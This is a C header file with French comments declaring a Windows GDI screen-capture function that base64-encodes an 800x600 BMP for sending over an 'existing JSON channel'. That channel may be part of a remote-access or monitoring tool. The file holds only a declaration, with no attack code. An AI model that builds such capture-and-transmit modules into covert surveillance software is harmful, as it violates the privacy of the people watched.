#ifndef SCREENSHOT_H
#define SCREENSHOT_H

#include <windows.h>
#include <stddef.h>

/**
 * Module Screenshot - Capture d'écran via GDI
 *
 * Capture l'écran complet, redimensionné à 800x600 (BMP 24-bit),
 * encodé en base64 pour transmission dans le canal JSON existant.
 *
 * Taille typique du résultat : ~1.9 MB (base64 d'un BMP 800x600)
 * → Nécessite un buffer de sortie d'au moins 2 MB
 */

#define SCREENSHOT_SUCCESS        0
#define SCREENSHOT_ERROR_CAPTURE  1
#define SCREENSHOT_ERROR_ENCODE   2

/**
 * Capture l'écran et retourne les données BMP encodées en base64
 *
 * @param output  Buffer de sortie (doit faire au moins 2 MB)
 * @param size    Taille du buffer
 * @return SCREENSHOT_SUCCESS ou code d'erreur
 */
int screenshot_grab(char *output, size_t size);

#endif // SCREENSHOT_H
